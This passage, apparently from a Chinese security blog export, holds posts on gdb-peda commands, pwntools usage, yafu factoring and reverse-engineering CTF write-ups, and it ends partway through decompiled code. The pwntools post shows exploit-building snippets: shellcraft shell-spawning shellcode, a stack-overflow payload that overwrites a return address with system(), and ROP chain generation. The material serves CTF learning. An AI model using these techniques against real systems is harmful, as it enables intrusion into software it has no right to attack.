命令可以查看设置好的运行参数。</span><br></pre></td></tr></tbody></table></figure>

<h1 id="插件命令"><a href="#插件命令" class="headerlink" title="插件命令"></a>插件命令</h1><p>aslr - 显示 / 设定 GDB 的 ASLR (地址空间配置随机加载) 设置</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">gdb-peda$ aslr</span><br><span class="line">ASLR is OFF</span><br></pre></td></tr></tbody></table></figure>

<p>checksec - 检查二进制文件的各种安全选项</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">dumpargs - 函数将要被调用时，显示将要被传入函数的所有参数(默认会在反汇编代码下方自动显示)</span><br><span class="line"></span><br><span class="line">dumprop - 在给定内存范围中Dump出所有ROP gadgets</span><br><span class="line"></span><br><span class="line">elfheader - 从被调试的ELF文件中获取标题信息</span><br><span class="line"></span><br><span class="line">elfsymbol - 从ELF文件获取非调试符号信息（plt表）</span><br><span class="line"></span><br><span class="line">lookup - 搜索所有地址/参考地址属于一个内存范围</span><br><span class="line"></span><br><span class="line">patch - 修补程序内存以string / hexstring / int的地址开始</span><br><span class="line"></span><br><span class="line">procinfo - 显示/ proc / pid /</span><br><span class="line"></span><br><span class="line">pshow - 显示各种PEDA选项和其他设置</span><br><span class="line"></span><br><span class="line">pset - 设置各种PEDA选项和其他设置</span><br><span class="line"></span><br><span class="line">pattern - 生成字符串模板 写入内存 用于定位溢出点</span><br><span class="line"></span><br><span class="line">pattern create size 生成特定长度字符串</span><br><span class="line">pattern offset value 定位字符串</span><br><span class="line">procinfo – Display various info from /proc/pid/</span><br><span class="line"></span><br><span class="line">pshow – Show various PEDA options and other settings</span><br><span class="line"></span><br><span class="line">pset– Set various PEDA options and other settings</span><br><span class="line"></span><br><span class="line">readelf - 从ELF文件获取标题信息</span><br><span class="line"></span><br><span class="line">ropgadget - 获取二进制或库的通用ROP小工具</span><br><span class="line"></span><br><span class="line">ropsearch - 在内存中搜索ROP小工具</span><br><span class="line"></span><br><span class="line">searchmem - 用搜索内存</span><br><span class="line"></span><br><span class="line">searchmem|find - 在内存中查找字符串，支持正则表达式，例如searchmem "/bin/sh" libc</span><br><span class="line">shellcode - 生成或下载常用的shellcode。</span><br><span class="line"></span><br><span class="line">skeleton - 生成python漏洞利用代码模板</span><br><span class="line"></span><br><span class="line">vmmap - 可以用来查看栈、bss段是否可以执行</span><br><span class="line"></span><br><span class="line">xormem - 用一个键异或存储区域</span><br><span class="line"></span><br><span class="line">ptype struct link_map - 查看link_map定义</span><br><span class="line"></span><br><span class="line">p &amp;((struct link_map*)0)-&gt;l_info - 查看l_info成员偏移</span><br></pre></td></tr></tbody></table></figure>

<p>作者：余生似梦<br>链接：<a href="https://www.jianshu.com/p/283b5466684b">https://www.jianshu.com/p/283b5466684b</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
]]></content>
      <categories>
        <category>CTF-Pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>pwntools 使用</title>
    <url>/2020/10/16/pwntools%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<ol>
<li><p>安装<br>安装可以参考我写的另一篇文章，不过也就几条命令。</p>
</li>
<li><p>模块介绍<br>使用 from pwn import * 将所有的模块导入到当前 namespace，这条语句还会帮你把 os,sys 等常用的系统库导入。</p>
</li>
</ol>
<p>常用模块如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台</span><br><span class="line">dynelf : 用于远程符号泄漏，需要提供leak方法</span><br><span class="line">elf : 对elf文件进行操作</span><br><span class="line">gdb : 配合gdb进行调试</span><br><span class="line">memleak : 用于内存泄漏</span><br><span class="line">shellcraft : shellcode的生成器</span><br><span class="line">tubes : 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE</span><br><span class="line">utils : 一些实用的小功能，例如CRC计算，cyclic pattern等</span><br></pre></td></tr></tbody></table></figure>

<span id="more"></span>
<ol start="3">
<li><p>连接</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">本地 ：sh = process("./level0")</span><br><span class="line">远程：sh = remote("127.0.0.1",10001)</span><br><span class="line">关闭连接：sh.close()  </span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>IO 模块</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sh.send(data)  发送数据</span><br><span class="line">sh.sendline(data)  发送一行数据，相当于在数据后面加\n</span><br><span class="line">sh.recv(numb = 2048, timeout = dufault)  接受数据，numb指定接收的字节，timeout指定超时</span><br><span class="line">sh.recvline(keepends=True)  接受一行数据，keepends为是否保留行尾的\n</span><br><span class="line">sh.recvuntil("Hello,World\n",drop=fasle)  接受数据直到我们设置的标志出现</span><br><span class="line">sh.recvall()  一直接收直到EOF</span><br><span class="line">sh.recvrepeat(timeout = default)  持续接受直到EOF或timeout</span><br><span class="line">sh.interactive()  直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>汇编和反汇编<br>汇编：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; asm('nop')</span><br><span class="line">'\x90'</span><br><span class="line">&gt;&gt;&gt; asm('nop', arch='arm')</span><br><span class="line">'\x00\xf0 \xe3'</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<p>可以使用 context 来指定 cpu 类型以及操作系统</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; context.arch      = 'i386'</span><br><span class="line">&gt;&gt;&gt; context.os        = 'linux'</span><br><span class="line">&gt;&gt;&gt; context.endian    = 'little'</span><br><span class="line">&gt;&gt;&gt; context.word_size = 32</span><br></pre></td></tr></tbody></table></figure>

<p>使用 disasm 进行反汇编</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; print disasm('6a0258cd80ebf9'.decode('hex'))</span><br><span class="line">   0:   6a 02                   push   0x2</span><br><span class="line">   2:   58                      pop    eax</span><br><span class="line">   3:   cd 80                   int    0x80</span><br><span class="line">   5:   eb f9                   jmp    0x0</span><br></pre></td></tr></tbody></table></figure>
<p>注意，asm 需要 binutils 中的 as 工具辅助，如果是不同于本机平台的其他平台的汇编，例如在我的 x86 机器上进行 mips 的汇编就会出现 as 工具未找到的情况，这时候需要安装其他平台的 cross-binutils。</p>
<ol start="6">
<li>Shellcode 生成器 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; print shellcraft.i386.nop().strip('\n')</span><br><span class="line">    nop</span><br><span class="line">&gt;&gt;&gt; print shellcraft.i386.linux.sh()</span><br><span class="line">    /* push '/bin///sh\x00' */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<p>结合 asm 可以可以得到最终的 pyaload。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os='linux',arch='amd64')</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh())</span><br></pre></td></tr></tbody></table></figure>

<p>除了直接执行 sh 之外，还可以进行其它的一些常用操作例如提权、反向连接等等。</p>
<ol start="7">
<li><p>ELF 文件操作</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; e = ELF('/bin/cat')</span><br><span class="line">&gt;&gt;&gt; print hex(e.address)  # 文件装载的基地址</span><br><span class="line">0x400000</span><br><span class="line">&gt;&gt;&gt; print hex(e.symbols['write']) # 函数地址</span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; print hex(e.got['write']) # GOT表的地址</span><br><span class="line">0x60b070</span><br><span class="line">&gt;&gt;&gt; print hex(e.plt['write']) # PLT的地址</span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; print hex(e.search('/bin/sh').next())# 字符串/bin/sh的地址</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>整数 pack 与数据 unpack<br>pack：p32，p64<br>unpack：u32，u64</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf = ELF('./level0')</span><br><span class="line">sys_addr = elf.symbols['system']</span><br><span class="line">payload = 'a' * (0x80 + 0x8) + p64(sys_addr)</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>ROP 链生成器</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">elf = ELF('ropasaurusrex')</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">rop.read(0, elf.bss(0x80))</span><br><span class="line">rop.dump()</span><br><span class="line"># ['0x0000:        0x80482fc (read)',</span><br><span class="line">#  '0x0004:       0xdeadbeef',</span><br><span class="line">#  '0x0008:              0x0',</span><br><span class="line">#  '0x000c:        0x80496a8']</span><br><span class="line">str(rop)</span><br><span class="line"># '\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08'</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<p>使用 ROP (elf) 来产生一个 rop 的对象，这时 rop 链还是空的，需要在其中添加函数。</p>
<p>因为 ROP 对象实现了 getattr 的功能，可以直接通过 func call 的形式来添加函数，rop.read (0, elf.bss (0x80)) 实际相当于 rop.call (‘read’, (0, elf.bss (0x80)))。<br>通过多次添加函数调用，最后使用 str 将整个 rop chain dump 出来就可以了。</p>
<p>call (resolvable, arguments=()) : 添加一个调用，resolvable 可以是一个符号，也可以是一个 int 型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式 (在后面加上一个逗号)<br>chain () : 返回当前的字节序列，即 payload<br>dump () : 直观地展示出当前的 rop chain<br>raw () : 在 rop chain 中加上一个整数或字符串<br>search (move=0, regs=None, order=’size’) : 按特定条件搜索 gadget<br>unresolve (value) : 给出一个地址，反解析出符号<br>LINK:<br>Exploit 利器 ——Pwntools<br>pwntools 官网</p>
<p>作者：ch3ckr<br>链接：<a href="https://www.jianshu.com/p/355e4badab50">https://www.jianshu.com/p/355e4badab50</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
]]></content>
      <categories>
        <category>CTF-Pwn</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>Linux</tag>
        <tag>pwntools</tag>
      </tags>
  </entry>
  <entry>
    <title>yafu 使用方法</title>
    <url>/2020/10/16/yafu%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<ol>
<li>yafu 使用方法</li>
</ol>
<p>使用 cmd 进入 yafu 的解压目录（为了方便的话，自己可以把该目录加入到环境变量。）</p>
<p>输入 yafu-x64 进入命令行</p>
<p>最常用的命令是 factor (n)，将 n 值分解</p>
<p>如分解 23333333333333</p>
<p>factor(23333333333333)</p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">fac: factoring 23333333333333</span><br><span class="line">fac: using pretesting plan: normal</span><br><span class="line">fac: no tune info: using qs/gnfs crossover of 95 digits</span><br><span class="line">div: primes less than 10000</span><br><span class="line">fmt: 1000000 iterations</span><br><span class="line">Total factoring time = 0.2805 seconds</span><br><span class="line"></span><br><span class="line">***factors found***</span><br><span class="line"></span><br><span class="line">P2 = 31</span><br><span class="line">P12 = 752688172043</span><br><span class="line"></span><br><span class="line">ans = 1</span><br></pre></td></tr></tbody></table></figure>

<ol start="2">
<li>使用 yafu 的时候遇到 mismatched parens</li>
</ol>
<p>这是因为在命令行里不支持过长的位数，所以我们只要把 n 的值从文件中去读取即可。</p>
<p>查看 yafu 的帮助：</p>
<p>yafu-x64.exe help<br>新建一个文件 pcat.txt，内容里写上 n 的值，如：</p>
<pp>
<p>注意：最后面一定要换行，不然会出现 eof; done processing batchfile</p>
<p>然后运行命令为</p>
<p>yafu-x64 “factor(@)” -batchfile pcat.txt</p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界 - reverse</title>
    <url>/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-reverse/</url>
    <content><![CDATA[<h2 id="0X01-game-2020-10-16"><a href="#0X01-game-2020-10-16" class="headerlink" title="0X01 game 2020.10.16"></a>0X01 game 2020.10.16</h2><p>IDA 打开，主要是 main_0 函数<br><img src="./game-1.png"></p>
<p>题目大概意思是：有若干灯，需要全部点亮，可以通过输入改变某一个灯的状态，但是相邻两个灯也会改变，全部灯亮方为获胜。</p>
<p>这是 main_0 函数主要的地方，if 条件通过后进入一个函数<br><img src="./game-2.png"></p>
<p>这个是进入的函数最主要的地方是<br><img src="./game-3.png"></p>
<p>paload：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">str1 = [18, 64, 98, 5, 2, 4, 6, 3, 6, 48, 49, 65, 32, 12, 48, 65, 31, 78, 62,</span><br><span class="line">        32, 49, 32, 1, 57, 96, 3, 21, 9, 4, 62, 3, 5, 4, 1, 2, 3, 44, 65, 78,</span><br><span class="line">        32, 16, 97, 54, 16, 44, 52, 32, 64, 89, 45, 32, 65, 15, 34, 18, 16, 0]</span><br><span class="line"></span><br><span class="line">str2 = [123, 32, 18, 98, 119, 108, 65, 41, 124, 80, 125, 38, 124, 111, 74, 49, 83, 108,</span><br><span class="line">        94, 108, 84, 6, 96, 83, 44, 121, 104, 110, 32, 95, 117, 101, 99, 123, 127, 119,</span><br><span class="line">        96, 48, 107, 71, 92, 29, 81, 107, 90, 85, 64, 12, 43, 76, 86, 13, 114, 1, 117, 126, 0]</span><br><span class="line"></span><br><span class="line">flag = ''</span><br><span class="line">for i in range(56):</span><br><span class="line">    x = str1[i] ^ str2[i]</span><br><span class="line">    flag += chr(x ^ 0x13)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></tbody></table></figure>]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>WriteUp-攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界 - re-Newbie_calculations</title>
    <url>/2020/12/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re-Newbie_calculations/</url>
    <content><![CDATA[<h1 id="攻防世界-re-Newbie-calculations"><a href="#攻防世界-re-Newbie-calculations" class="headerlink" title="攻防世界-re-Newbie_calculations"></a>攻防世界 - re-Newbie_calculations</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><img src="./Newbie_calculations_1.png"></p>
<span id="more"></span>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">{</span><br><span class="line">  int v3; // eax</span><br><span class="line">  int v4; // eax</span><br><span class="line">  int v5; // eax</span><br><span class="line">  int v6; // eax</span><br><span class="line">  int v7; // eax</span><br><span class="line">  int v8; // eax</span><br><span class="line">  int v9; // eax</span><br><span class="line">  int v10; // eax</span><br><span class="line">  int v11; // eax</span><br><span class="line">  int v12; // eax</span><br><span class="line">  int v13; // eax</span><br><span class="line">  int v14; // eax</span><br><span class="line">  int v15; // eax</span><br><span class="line">  int v16; // eax</span><br><span class="line">  int v17; // eax</span><br><span class="line">  int v18; // eax</span><br><span class="line">  int v19; // eax</span><br><span class="line">  int v20; // eax</span><br><span class="line">  int v21; // eax</span><br><span class="line">  int v22; // eax</span><br><span class="line">  int v23; // eax</span><br><span class="line">  int v24; // eax</span><br><span class="line">  int v25; // eax</span><br><span class="line">  int v26; // eax</span><br><span class="line">  int v27; // eax</span><br><span class="line">  int v28; // eax</span><br><span class="line">  int v29; // eax</span><br><span class="line">  int v30; // eax</span><br><span class="line">  int v31; // eax</span><br><span class="line">  int v32; // eax</span><br><span class="line">  int v33; // eax</span><br><span class="line">  int v34; // eax</span><br><span class="line">  int v35; // eax</span><br><span class="line">  int v36; // eax</span><br><span class="line">  int v37; // eax</span><br><span class="line">  int v38; // eax</span><br><span class="line">  int v39; // eax</span><br><span class="line">  int v40; // eax</span><br><span class="line">  int v41; // eax</span><br><span class="line">  int v42; // eax</span><br><span class="line">  int v43; // eax</span><br><span class="line">  int v44; // eax</span><br><span class="line">  int v45; // eax</span><br><span class="line">  int v46; // eax</span><br><span class="line">  int v47; // eax</span><br><span class="line">  int v48; // eax</span><br><span class="line">  int v49; // eax</span><br><span class="line">  int v50; // eax</span><br><span class="line">  int v51; // eax</span><br><span class="line">  int v52; // eax</span><br><span class="line">  int v53; // eax</span><br><span class="line">  int v54; // eax</span><br><span class="line">  int v55; // eax</span><br><span class="line">  int v56; // eax</span><br><span class="line">  int v57; // eax</span><br><span class="line">  int v58; // eax</span><br><span class="line">  int v59; // eax</span><br><span class="line">  int v60; // eax</span><br><span class="line">  int v61; // eax</span><br><span class="line">  int v62; // eax</span><br><span class="line">  int v63; // eax</span><br><span class="line">  int v64; // eax</span><br><span class="line">  int v65; // eax</span><br><span class="line">  int v66; // eax</span><br><span class="line">  int v67; // eax</span><br><span class="line">  int v68; // eax</span><br><span class="line">  int v69; // eax</span><br><span class="line">  int v70; // eax</span><br><span class="line">  int v71; // eax</span><br><span class="line">  int v72; // eax</span><br><span class="line">  int v73; // eax</span><br><span class="line">  int v74; // eax</span><br><span class="line">  int v75; // eax</span><br><span class="line">  int v76; // eax</span><br><span class="line">  int v77; // eax</span><br><span class="line">  int v78; // eax</span><br><span class="line">  int v79; // eax</span><br><span class="line">  int v80; // eax</span><br><span class="line">  int v81; // eax</span><br><span class="line">  int v82; // eax</span><br><span class="line">  int v83; // eax</span><br><span class="line">  int v84; // eax</span><br><span class="line">  int v85; // eax</span><br><span class="line">  int v86; // eax</span><br><span class="line">  int v87; // eax</span><br><span class="line">  int v88; // eax</span><br><span class="line">  int v89; // eax</span><br><span class="line">  int v90; // eax</span><br><span class="line">  int v91; // eax</span><br><span class="line">  int v92; // eax</span><br><span class="line">  int v93; // eax</span><br><span class="line">  int v94; // eax</span><br><span class="line">  int v95; // eax</span><br><span class="line">  int v96; // eax</span><br><span class="line">  int v97; // eax</span><br><span class="line">  int v98; // eax</span><br><span class="line">  int v99; // eax</span><br><span class="line">  int v100; // eax</span><br><span class="line">  int v101; // eax</span><br><span class="line">  int v102; // eax</span><br><span class="line">  int v103; // eax</span><br><span class="line">  int v104; // eax</span><br><span class="line">  int v105; // eax</span><br><span class="line">  int v106; // eax</span><br><span class="line">  int v107; // eax</span><br><span class="line">  int v108; // eax</span><br><span class="line">  int v109; // ST1C_4</span><br><span class="line">  int v110; // eax</span><br><span class="line">  int v111; // eax</span><br><span class="line">  int v112; // ST20_4</span><br><span class="line">  int v113; // eax</span><br><span class="line">  int v114; // eax</span><br><span class="line">  int v115; // ST20_4</span><br><span class="line">  int v116; // eax</span><br><span class="line">  signed int i; // [esp+4h] [ebp-90h]</span><br><span class="line">  signed int j; // [esp+8h] [ebp-8Ch]</span><br><span class="line">  int v120[32]; // [esp+Ch] [ebp-88h]</span><br><span class="line">  int v121[32]; // [esp+10h] [ebp-84h]</span><br><span class="line">  int v122[32]; // [esp+14h] [ebp-80h]</span><br><span class="line">  int _18[32]; // [esp+18h] [ebp-7Ch]</span><br><span class="line">  int _1C[32]; // [esp+1Ch] [ebp-78h]</span><br><span class="line">  int _20[32]; // [esp+20h] [ebp-74h]</span><br><span class="line">  int _24[32]; // [esp+24h] [ebp-70h]</span><br><span class="line">  int _28[32]; // [esp+28h] [ebp-6Ch]</span><br><span class="line">  int _2C[32]; // [esp+2Ch] [ebp-68h]</span><br><span class="line">  int _30[32]; // [esp+30h] [ebp-64h]</span><br><span class="line">  int _34[32]; // [esp+34h] [ebp-60h]</span><br><span class="line">  int _38[32]; // [esp+38h] [ebp-5Ch]</span><br><span class="line">  int _3C[32]; // [esp+3Ch] [ebp-58h]</span><br><span class="line">  int _40[32]; // [esp+40h] [ebp-54h]</span><br><span class="line">  int _44[32]; // [esp+44h] [ebp-50h]</span><br><span class="line">  int _48[32]; // [esp+48h] [ebp-4Ch]</span><br><span class="line">  int _4C[32]; // [esp+4Ch] [ebp-48h]</span><br><span class="line">  int _50[32]; // [esp+50h] [ebp-44h]</span><br><span class="line">  int _54[32]; // [esp+54h] [ebp-40h]</span><br><span class="line">  int _58[32]; // [esp+58h] [ebp-3Ch]</span><br><span class="line">  int _5C[32]; // [esp+5Ch] [ebp-38h]</span><br><span class="line">  int _60[32]; // [esp+60h] [ebp-34h]</span><br><span class="line">  int _64[32]; // [esp+64h] [ebp-30h]</span><br><span class="line">  int _68[32]; // [esp+68h] [ebp-2Ch]</span><br><span class="line">  int _6C[32]; // [esp+6Ch] [ebp-28h]</span><br><span class="line">  int _70[32]; // [esp+70h] [ebp-24h]</span><br><span class="line">  int _74[32]; // [esp+74h] [ebp-20h]</span><br><span class="line">  int _78[32]; // [esp+78h] [ebp-1Ch]</span><br><span class="line">  int _7C[32]; // [esp+7Ch] [ebp-18h]</span><br><span class="line">  int _80[32]; // [esp+80h] [ebp-14h]</span><br><span class="line">  int _84[32]; // [esp+84h] [ebp-10h]</span><br><span class="line">  int _88[32]; // [esp+88h] [ebp-Ch]</span><br><span class="line">  int v152; // [esp+8Ch] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt; 32; ++i )</span><br><span class="line">    v120[i] = 1;</span><br><span class="line">  v152 = 0;</span><br><span class="line">  puts("Your flag is:");</span><br><span class="line">  v3 = sub_401100(v120, 1000000000);</span><br><span class="line">  v4 = sub_401220(v3, 999999950);</span><br><span class="line">  sub_401100(v4, 2);</span><br><span class="line">  v5 = sub_401000(v121, 5000000);</span><br><span class="line">  v6 = sub_401220(v5, 6666666);</span><br><span class="line">  v7 = sub_401000(v6, 1666666);</span><br><span class="line">  v8 = sub_401000(v7, 45);</span><br><span class="line">  v9 = sub_401100(v8, 2);</span><br><span class="line">  sub_401000(v9, 5);</span><br><span class="line">  v10 = sub_401100(v122, 1000000000);</span><br><span class="line">  v11 = sub_401220(v10, 999999950);</span><br><span class="line">  v12 = sub_401100(v11, 2);</span><br><span class="line">  sub_401000(v12, 2);</span><br><span class="line">  v13 = sub_401000(_18, 55);</span><br><span class="line">  v14 = sub_401220(v13, 3);</span><br><span class="line">  v15 = sub_401000(v14, 4);</span><br><span class="line">  sub_401220(v15, 1);</span><br><span class="line">  v16 = sub_401100(_1C, 100000000);</span><br><span class="line">  v17 = sub_401220(v16, 99999950);</span><br><span class="line">  v18 = sub_401100(v17, 2);</span><br><span class="line">  sub_401000(v18, 2);</span><br><span class="line">  v19 = sub_401220(_20, 1);</span><br><span class="line">  v20 = sub_401100(v19, 1000000000);</span><br><span class="line">  v21 = sub_401000(v20, 55);</span><br><span class="line">  sub_401220(v21, 3);</span><br><span class="line">  v22 = sub_401100(_24, 1000000);</span><br><span class="line">  v23 = sub_401220(v22, 999975);</span><br><span class="line">  sub_401100(v23, 4);</span><br><span class="line">  v24 = sub_401000(_28, 55);</span><br><span class="line">  v25 = sub_401220(v24, 33);</span><br><span class="line">  v26 = sub_401000(v25, 44);</span><br><span class="line">  sub_401220(v26, 11);</span><br><span class="line">  v27 = sub_401100(_2C, 10);</span><br><span class="line">  v28 = sub_401220(v27, 5);</span><br><span class="line">  v29 = sub_401100(v28, 8);</span><br><span class="line">  sub_401000(v29, 9);</span><br><span class="line">  v30 = sub_401000(_30, 0);</span><br><span class="line">  v31 = sub_401220(v30, 0);</span><br><span class="line">  v32 = sub_401000(v31, 11);</span><br><span class="line">  v33 = sub_401220(v32, 11);</span><br><span class="line">  sub_401000(v33, 53);</span><br><span class="line">  v34 = sub_401000(_34, 49);</span><br><span class="line">  v35 = sub_401220(v34, 2);</span><br><span class="line">  v36 = sub_401000(v35, 4);</span><br><span class="line">  sub_401220(v36, 2);</span><br><span class="line">  v37 = sub_401100(_38, 1000000);</span><br><span class="line">  v38 = sub_401220(v37, 999999);</span><br><span class="line">  v39 = sub_401100(v38, 4);</span><br><span class="line">  sub_401000(v39, 50);</span><br><span class="line">  v40 = sub_401000(_3C, 1);</span><br><span class="line">  v41 = sub_401000(v40, 1);</span><br><span class="line">  v42 = sub_401000(v41, 1);</span><br><span class="line">  v43 = sub_401000(v42, 1);</span><br><span class="line">  v44 = sub_401000(v43, 1);</span><br><span class="line">  v45 = sub_401000(v44, 1);</span><br><span class="line">  v46 = sub_401000(v45, 10);</span><br><span class="line">  sub_401000(v46, 32);</span><br><span class="line">  v47 = sub_401100(_40, 10);</span><br><span class="line">  v48 = sub_401220(v47, 5);</span><br><span class="line">  v49 = sub_401100(v48, 8);</span><br><span class="line">  v50 = sub_401000(v49, 9);</span><br><span class="line">  sub_401000(v50, 48);</span><br><span class="line">  v51 = sub_401220(_44, 1);</span><br><span class="line">  v52 = sub_401100(v51, -294967296);</span><br><span class="line">  v53 = sub_401000(v52, 55);</span><br><span class="line">  sub_401220(v53, 3);</span><br><span class="line">  v54 = sub_401000(_48, 1);</span><br><span class="line">  v55 = sub_401000(v54, 2);</span><br><span class="line">  v56 = sub_401000(v55, 3);</span><br><span class="line">  v57 = sub_401000(v56, 4);</span><br><span class="line">  v58 = sub_401000(v57, 5);</span><br><span class="line">  v59 = sub_401000(v58, 6);</span><br><span class="line">  v60 = sub_401000(v59, 7);</span><br><span class="line">  sub_401000(v60, 20);</span><br><span class="line">  v61 = sub_401100(_4C, 10);</span><br><span class="line">  v62 = sub_401220(v61, 5);</span><br><span class="line">  v63 = sub_401100(v62, 8);</span><br><span class="line">  v64 = sub_401000(v63, 9);</span><br><span class="line">  sub_401000(v64, 48);</span><br><span class="line">  v65 = sub_401000(_50, 7);</span><br><span class="line">  v66 = sub_401000(v65, 6);</span><br><span class="line">  v67 = sub_401000(v66, 5);</span><br><span class="line">  v68 = sub_401000(v67, 4);</span><br><span class="line">  v69 = sub_401000(v68, 3);</span><br><span class="line">  v70 = sub_401000(v69, 2);</span><br><span class="line">  v71 = sub_401000(v70, 1);</span><br><span class="line">  sub_401000(v71, 20);</span><br><span class="line">  v72 = sub_401000(_54, 7);</span><br><span class="line">  v73 = sub_401000(v72, 2);</span><br><span class="line">  v74 = sub_401000(v73, 4);</span><br><span class="line">  v75 = sub_401000(v74, 3);</span><br><span class="line">  v76 = sub_401000(v75, 6);</span><br><span class="line">  v77 = sub_401000(v76, 5);</span><br><span class="line">  v78 = sub_401000(v77, 1);</span><br><span class="line">  sub_401000(v78, 20);</span><br><span class="line">  v79 = sub_401100(_58, 1000000);</span><br><span class="line">  v80 = sub_401220(v79, 999999);</span><br><span class="line">  v81 = sub_401100(v80, 4);</span><br><span class="line">  v82 = sub_401000(v81, 50);</span><br><span class="line">  sub_401220(v82, 1);</span><br><span class="line">  v83 = sub_401220(_5C, 1);</span><br><span class="line">  v84 = sub_401100(v83, -294967296);</span><br><span class="line">  v85 = sub_401000(v84, 49);</span><br><span class="line">  sub_401220(v85, 1);</span><br><span class="line">  v86 = sub_401220(_60, 1);</span><br><span class="line">  v87 = sub_401100(v86, 1000000000);</span><br><span class="line">  v88 = sub_401000(v87, 54);</span><br><span class="line">  v89 = sub_401220(v88, 1);</span><br><span class="line">  v90 = sub_401000(v89, 1000000000);</span><br><span class="line">  sub_401220(v90, 1000000000);</span><br><span class="line">  v91 = sub_401000(_64, 49);</span><br><span class="line">  v92 = sub_401220(v91, 1);</span><br><span class="line">  v93 = sub_401000(v92, 2);</span><br><span class="line">  sub_401220(v93, 1);</span><br><span class="line">  v94 = sub_401100(_68, 10);</span><br><span class="line">  v95 = sub_401220(v94, 5);</span><br><span class="line">  v96 = sub_401100(v95, 8);</span><br><span class="line">  v97 = sub_401000(v96, 9);</span><br><span class="line">  sub_401000(v97, 48);</span><br><span class="line">  v98 = sub_401000(_6C, 1);</span><br><span class="line">  v99 = sub_401000(v98, 3);</span><br><span class="line">  v100 = sub_401000(v99, 3);</span><br><span class="line">  v101 = sub_401000(v100, 3);</span><br><span class="line">  v102 = sub_401000(v101, 6);</span><br><span class="line">  v103 = sub_401000(v102, 6);</span><br><span class="line">  v104 = sub_401000(v103, 6);</span><br><span class="line">  sub_401000(v104, 20);</span><br><span class="line">  v105 = sub_401000(_70, 55);</span><br><span class="line">  v106 = sub_401220(v105, 33);</span><br><span class="line">  v107 = sub_401000(v106, 44);</span><br><span class="line">  v108 = sub_401220(v107, 11);</span><br><span class="line">  sub_401000(v108, 42);</span><br><span class="line">  sub_401000(_74, _70[0]);</span><br><span class="line">  sub_401000(_78, _3C[0]);</span><br><span class="line">  v109 = _78[0];</span><br><span class="line">  v110 = sub_401220(_7C, 1);</span><br><span class="line">  v111 = sub_401000(v110, v109);</span><br><span class="line">  sub_401220(v111, 1);</span><br><span class="line">  v112 = _68[0];</span><br><span class="line">  v113 = sub_401220(_80, 1);</span><br><span class="line">  v114 = sub_401100(v113, 